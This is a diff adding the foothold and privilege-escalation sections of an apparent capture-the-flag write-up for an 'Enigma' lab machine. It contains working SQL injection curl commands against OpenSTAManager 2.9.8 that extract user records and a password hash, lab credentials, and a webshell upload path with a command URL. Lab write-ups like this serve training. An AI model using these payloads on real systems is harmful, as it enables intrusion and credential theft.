@@ -213,11 +213,19 @@ The contents of the .pdf file are as follows:
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 15.44.51.png" alt=""><figcaption></figcaption></figure>
 
-We then add the `mail001.enigma.htb` record to the /etc/hosts file, and continue navigating to the roundcube webapp.
+### 2. Foothold / Initial Access
+
+#### 2.1 Description
+
+> In order to get initial access, we first login as kevin, notice the e-mail of sarah and then login as the user sarah with the same password. After logging into sarah's account, there are more credentials to the backup website: OpenSTAManager. It is possible to retrieve the password of the user haris, which equals that of the local user haris and a command injection vulnerability, which grants us a shell as the user www-data, which we later su to the user haris.
+
+#### 2.2 Exploitation
+
+We then add the `mail001.enigma.htb` record to the /etc/hosts file, and continue navigating to the roundcube webapp and login as the user kevin.
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 15.46.58.png" alt=""><figcaption></figcaption></figure>
 
-Inside Roundcube, we find an email from `sarah` to Kevin. We later confirm that the password `Enigma2024!` also works for e-mail account `sarah`. After logging in as Sarah, we find the following credentials about OpenSTAManager with admin credentials.
+Inside Roundcube, we find an email from `sarah` to Kevin. We later confirm that the password `Enigma2024!` also works for the e-mail account `sarah`. After logging in as Sarah, we find the following credentials about OpenSTAManager with admin credentials.
 
 <figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 15.56.55.png" alt=""><figcaption></figcaption></figure>
 
@@ -228,25 +236,63 @@ After seeing the mail sarah recieved from IT, I updated the `/etc/hosts` file. T
 10.129.30.247 enigma enigma.htb mail001.enigma.htb support_001.enigma.htb
 ```
 
-The admin credentials work on openSTAManager, and we notice that the version 2.9.8 contains 2 vulnerabilities; 1: an SQL injection, from which we retrieve the bcrypt hash of the user&#x20;
+We navigate to `support_001.enigma.htb`
 
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 18.53.18.png" alt=""><figcaption></figcaption></figure>
 
+The admin credentials work on openSTAManager, and we notice that the version 2.9.8 contains 2 vulnerabilities; 1: an SQL injection, from which we retrieve the bcrypt hash of the user and the second is a command injection vulnerability, which will get us a shell as the user `www-data`
 
-### 2. Foothold / Initial Access
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 18.54.28.png" alt=""><figcaption></figcaption></figure>
 
-#### 2.1 Description
+* [SQL injection](https://github.com/advisories/GHSA-qx9p-w3vj-q24q)
 
-<...>
+```bash
+# login
+curl -c cookies.txt -X POST 'http://support_001.enigma.htb:80/index.php?op=login' -d 'username=admin&password=Ne3s4rtars78s'
+  
+# extract users
+curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,':',email) FROM zz_users LIMIT 1,2)))%23" "http://support_001.enigma.htb:80/actions.php?id_module=18"
+  
+# extract hash (2 parts)
+curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM zz_users LIMIT 1,2)))%23" "http://support_001.enigma.htb:80/actions.php?id_module=18"
+curl -b cookies.txt -d "op=send_reminder&id_records[]=-999) AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,60) FROM zz_users LIMIT 1,2)))%23" "http://support_001.enigma.htb:80/actions.php?id_module=18"
 
-#### 2.2 Exploitation
+# this results in the hash 
+$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
 
-***
+# which cracks as the password "bestfriends"
+haris:bestfriends
+```
+
+* [Command injection](https://github.com/advisories/GHSA-25fp-8w8p-mx36)
+
+Next up is the command injection vulnerability, according to the tutorial we can upload a .zip shell within a php shell. We do this with the following script:
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 19.06.09.png" alt=""><figcaption></figcaption></figure>
+
+Upload it under `Sales` > `Sales invoices` > `Importazione FE`
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 19.08.27.png" alt=""><figcaption></figcaption></figure>
+
+And we then reach the shell at:&#x20;
+
+```bash
+http://support_001.enigma.htb/files/SHELL.php?c=id
+```
+
+This results in a webshell as the user `www-data`, we then later upgrade with a reverse shell to the user `haris`.
+
+<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-07-06 om 19.10.58.png" alt=""><figcaption></figcaption></figure>
 
 ### 3. Privilege Escalation
 
 #### 3.1 Description
 
-<...>
+> In order to escalate from the user haris to the user root, we have to setup an local SSH forward using the command `ssh -L 1337:127.0.0.1:1337` as the user haris. Once we can reach the Olivetin application, we can then use a set of commands used to get command execution as the user root.
+
+#### 3.2 Exploitaton
+
+
 
 ```
 ```
